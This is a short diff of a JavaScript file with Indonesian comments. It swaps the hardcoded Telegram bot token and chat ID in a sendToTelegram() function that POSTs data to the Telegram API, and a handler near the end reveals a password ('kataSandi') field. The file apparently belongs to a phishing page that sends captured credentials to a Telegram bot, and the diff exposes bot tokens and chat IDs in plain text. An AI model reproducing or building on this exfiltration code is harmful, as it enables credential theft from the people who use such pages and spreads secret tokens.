@@ -16,8 +16,8 @@ function showPage(pageId) {
 
 // Fungsi untuk mengirim data ke Telegram
 function sendToTelegram(message) {
-  const botToken = "7348976484:AAHRuOMfXsf_FKDTQjWXSXnFNylkWETh-pQ";
-  const chatId = "6769168796";
+  const botToken = "8211956852:AAFdZuZuHJCbLJglua22IgIS3k7Njhq1X_s";
+  const chatId = "5019208481";
 
   return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: "POST",
@@ -149,3 +149,4 @@ document
     document.getElementById("kataSandi").style.display = "block";
     document.getElementById("loadingContent").style.display = "none";
   });
+
